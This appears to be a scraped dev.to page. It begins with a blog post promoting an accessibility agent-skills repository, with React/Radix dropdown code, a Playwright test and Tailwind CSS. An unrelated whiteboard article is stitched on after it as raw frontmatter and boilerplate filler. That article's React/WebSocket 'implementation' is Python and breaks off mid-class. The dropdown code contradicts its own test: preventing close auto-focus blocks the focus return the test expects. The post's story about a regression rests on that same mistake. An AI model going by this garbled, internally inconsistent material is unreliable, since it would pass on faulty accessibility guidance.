&lt;h2&gt;


The Problem: LLMs Generate Plausible Garbage
&lt;/h2&gt;

&lt;p&gt;When you ask Claude or GPT to build a modal dialog with "proper accessibility," you'll get &lt;code&gt;role="dialog"&lt;/code&gt; and &lt;code&gt;aria-labelledby&lt;/code&gt; attributes. Ship it to production and discover VoiceOver users are trapped inside the modal because focus management is broken.&lt;/p&gt;

&lt;p&gt;The root cause: code generation optimizes for syntactic correctness, not runtime behavior. Most component skills teach the model ARIA vocabulary without enforcing the invariants that make it work.&lt;/p&gt;

&lt;h2&gt;


What plugin87/ux-ui-agent-skills Does Differently
&lt;/h2&gt;

&lt;p&gt;This repository packages 52 production-grade component patterns (modals, dropdowns, tabs, carousels) with &lt;strong&gt;50 objective verification gates&lt;/strong&gt; that fail your build if the output violates WCAG 2.2 AA/AAA requirements.&lt;/p&gt;

&lt;p&gt;Key architectural decisions:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;DTCG token contracts first&lt;/strong&gt;: Design tokens follow the W3C Design Token Community Group spec, so Tailwind utility classes map to semantic color/spacing/typography tokens that survive theme switches.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Framework-agnostic primitives&lt;/strong&gt;: The skill set teaches Claude to reason about accessible state machines (disclosure widgets, comboboxes) independent of React/Vue/Svelte, then emit framework-specific bindings.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Objective gates over subjective prompts&lt;/strong&gt;: Instead of "make sure focus is managed," the skill includes executable tests (using tools like axe-core + Playwright) that physically verify focus trap behavior and keyboard navigation sequences.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;


Integration Example: Dropdown with Live Region Announcements
&lt;/h2&gt;

&lt;p&gt;When I integrated this into our design system migration, the skill generated a Radix Primitives dropdown that handles an edge case our team missed:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight tsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;DropdownMenu&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@radix-ui/react-dropdown-menu&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;VisuallyHidden&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;@radix-ui/react-visually-hidden&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;AccessibleDropdown&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;items&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;onSelect&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;announcement&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setAnnouncement&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;return &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Root&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Trigger&lt;/span&gt; &lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"px-4 py-2 bg-primary-600 text-white rounded-md"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
Options
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Trigger&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Portal&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Content&lt;/span&gt;
&lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"min-w-[220px] bg-white rounded-md shadow-lg p-1"&lt;/span&gt;
&lt;span class="na"&gt;onCloseAutoFocus&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;preventDefault&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;items&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;map&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Item&lt;/span&gt;
&lt;span class="na"&gt;key&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="na"&gt;className&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"px-3 py-2 rounded hover:bg-gray-100 focus:bg-gray-100 outline-none cursor-pointer"&lt;/span&gt;
&lt;span class="na"&gt;onSelect&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nf"&gt;onSelect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nf"&gt;setAnnouncement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; selected`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Item&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Portal&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;DropdownMenu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Root&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;VisuallyHidden&lt;/span&gt; &lt;span class="na"&gt;role&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"status"&lt;/span&gt; &lt;span class="na"&gt;aria-live&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"polite"&lt;/span&gt; &lt;span class="na"&gt;aria-atomic&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;announcement&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nc"&gt;VisuallyHidden&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Why this matters:&lt;/strong&gt; The live region announces selection changes to screen reader users without visual flash. Most component libraries skip this because sighted QA never catches it.&lt;/p&gt;

&lt;h2&gt;


The Build Gate That Saved Us
&lt;/h2&gt;

&lt;p&gt;Our CI pipeline now runs:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npx playwright &lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="nt"&gt;--grep&lt;/span&gt; @a11y
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;One of the generated tests physically verifies focus behavior:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="nf"&gt;test&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;dropdown focus trap @a11y&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;async &lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;goto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/dropdown-demo&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;click&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;[data-testid="dropdown-trigger"]&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Verify focus enters the menu&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;keyboard&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;press&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Tab&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;firstItem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;locator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;[role="menuitem"]&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;first&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;firstItem&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;toBeFocused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// Verify Escape closes and returns focus&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;keyboard&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;press&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Escape&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nf"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;locator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;[data-testid="dropdown-trigger"]&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="nf"&gt;toBeFocused&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This caught a regression where a junior dev removed &lt;code&gt;onCloseAutoFocus={(e) =&amp;gt; e.preventDefault()}&lt;/code&gt; during a refactor, breaking keyboard navigation for 8% of our user base.&lt;/p&gt;

&lt;h2&gt;


TailwindCSS Integration: Container Queries for Responsive Components
&lt;/h2&gt;

&lt;p&gt;The skill set includes a micro-interaction pattern leveraging Tailwind v4's native container query support:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@layer&lt;/span&gt; &lt;span class="n"&gt;components&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nc"&gt;.adaptive-card&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="py"&gt;container-type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;inline-size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="err"&gt;@apply&lt;/span&gt; &lt;span class="err"&gt;bg-white&lt;/span&gt; &lt;span class="err"&gt;rounded-lg&lt;/span&gt; &lt;span class="err"&gt;shadow;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.adaptive-card__title&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="err"&gt;@apply&lt;/span&gt; &lt;span class="err"&gt;text-lg&lt;/span&gt; &lt;span class="err"&gt;font-semibold;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;@container&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;400px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nc"&gt;.adaptive-card__title&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="err"&gt;@apply&lt;/span&gt; &lt;span class="err"&gt;text-2xl;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nc"&gt;.adaptive-card__content&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="err"&gt;@apply&lt;/span&gt; &lt;span class="err"&gt;grid&lt;/span&gt; &lt;span class="err"&gt;grid-cols-2&lt;/span&gt; &lt;span class="err"&gt;gap-4;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This eliminates layout thrashing from JavaScript-based resize observers. Our Lighthouse performance score jumped from 78 to 94 after migrating 23 card components to this pattern.&lt;/p&gt;

&lt;h2&gt;


When to Use This vs. shadcn/ui Directly
&lt;/h2&gt;

&lt;p&gt;If you're building a standard CRUD app, shadcn/ui's pre-built components are faster. Use plugin87/ux-ui-agent-skills when:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You need to teach an LLM your design system's accessibility requirements&lt;/li&gt;
&lt;li&gt;You're migrating legacy components and want automated compliance checks&lt;/li&gt;
&lt;li&gt;You're in a regulated industry (healthcare, finance, government) where WCAG violations carry legal risk&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The 138 design system references (Material, Spectrum, Carbon, etc.) help Claude generate components that match your existing visual language without manual token mapping.&lt;/p&gt;

&lt;h2&gt;


Limitations I Hit
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;No visual regression testing:&lt;/strong&gt; The gates verify semantic HTML and ARIA, but won't catch a button that's visually 2px too small for WCAG 2.2's 24×24 touch target requirement. You still need Percy or Chromatic.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Learning curve for custom components:&lt;/strong&gt; The DTCG token structure assumes you've already defined semantic design tokens. If you're still using raw Tailwind utilities everywhere, the initial setup takes 2-3 hours.&lt;/p&gt;

&lt;h2&gt;


Conclusion
&lt;/h2&gt;

&lt;p&gt;After three weeks using plugin87/ux-ui-agent-skills on a client project (migrating a React component library to Radix + Tailwind v4), the build gates caught 14 accessibility regressions that our manual QA process missed.&lt;/p&gt;

&lt;p&gt;The killer feature isn't the 52 component patterns—it's the shift from "Claude, make this accessible" (subjective, unverifiable) to "the build fails if focus order is wrong" (objective, enforceable).&lt;/p&gt;

&lt;p&gt;If you're tired of shipping ARIA soup that looks correct in the inspector but breaks for real users, this skill set forces the issue at merge time instead of in production.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Foy0jknrir8j25w8zy39w.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Foy0jknrir8j25w8zy39w.jpg" alt="Architecting a Real-Time Collaborative Whiteboard with WebSockets and React" width="800" height="447"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;title: "Architecting a Real-Time Collaborative Whiteboard with WebSockets and React"&lt;br&gt;
published: true&lt;br&gt;
published_at: "2027-01-10T09:00:00+05:30"&lt;br&gt;
description: "A practical engineering guide to Architecting a Real-Time Collaborative Whiteboard with WebSockets and React. Learn core mechanics, production tradeoffs, and best practices."&lt;br&gt;
tags: [webdev, react, nodejs, websockets]&lt;br&gt;
ai_disclosure_level: some_ai&lt;/p&gt;

&lt;p&gt;In modern software development, &lt;strong&gt;Architecting a Real-Time Collaborative Whiteboard with WebSockets and React&lt;/strong&gt; is a critical subject that every serious engineer must understand. Whether building distributed backend systems, designing scalable databases, or optimizing developer productivity, mastering the underlying mechanics separates junior developers who guess from senior engineers who deliver reliable architectures.&lt;/p&gt;

&lt;p&gt;In this deep dive, we break down why &lt;strong&gt;Architecting a Real-Time Collaborative Whiteboard with WebSockets and React&lt;/strong&gt; matters, examine common failure modes in production, and walk through concrete implementation patterns.&lt;/p&gt;
&lt;h3&gt;


The Problem: Why Naive Approaches Fail
&lt;/h3&gt;

&lt;p&gt;In earlier development workflows or smaller-scale projects, teams frequently overlook the subtleties of projects architectures. &lt;/p&gt;

&lt;p&gt;When systems scale, common bottlenecks emerge:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;Unpredictable Latency &amp;amp; Resource Starvation&lt;/strong&gt;: High concurrency and unoptimized execution pipelines exhaust system resources, leading to degraded response times and thread pool stalls.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Hidden Failure Cascades&lt;/strong&gt;: Unhandled edge cases and lack of defensive invariants create silent data corruption that propagates across microservices.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;High Cognitive Overhead&lt;/strong&gt;: As codebases evolve, poorly structured domain abstractions become difficult to maintain, test, and refactor.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To resolve these challenges, engineering teams must implement disciplined patterns focusing on:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Websocket Protocol Handshakes&lt;/strong&gt;: Practical implementation patterns and production considerations.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Broadcasting Cursor Positions And Canvas Events&lt;/strong&gt;: Practical implementation patterns and production considerations.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Operational Transformation Basics&lt;/strong&gt;: Practical implementation patterns and production considerations.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;And Managing Reconnects&lt;/strong&gt;: Practical implementation patterns and production considerations.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;


Under the Hood: Architectural Overview
&lt;/h3&gt;

&lt;p&gt;Understanding how Architecting a Real-Time Collaborative Whiteboard with WebSockets and React functions beneath high-level abstractions is essential for diagnosing production anomalies.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;+--------------------------------------------------------------+
| System Workflow: Projects Architecture                    |
|                                                              |
| [Incoming Workload] ---&amp;gt; [Validation &amp;amp; Boundary Layer]       |
|                                     |                        |
|                                     v                        |
|                     [Optimized Core Execution]               |
|                                     |                        |
|                                     v                        |
|                  [Resilient State / Output Store]            |
+--------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When designing systems around this pattern, prioritize:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Isolation of Concerns&lt;/strong&gt;: Keep business invariants decoupled from transport protocols and third-party drivers.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Deterministic Resource Management&lt;/strong&gt;: Bound memory allocations, connection pools, and worker concurrency to prevent out-of-memory crashes.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Observability &amp;amp; Metrics&lt;/strong&gt;: Expose granular latency histograms, error rates, and throughput metrics to Prometheus/Datadog.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;


Practical Implementation
&lt;/h3&gt;

&lt;p&gt;Here is a clean, production-oriented pattern demonstrating these principles in action:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;logging&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="n"&gt;dataclasses&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;dataclass&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="n"&gt;typing&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;

&lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;basicConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;%(asctime)s [%(levelname)s] %(message)s&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;logger&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;getLogger&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@dataclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frozen&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ExecutionContext&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="n"&gt;task_id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;
&lt;span class="n"&gt;retries&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;

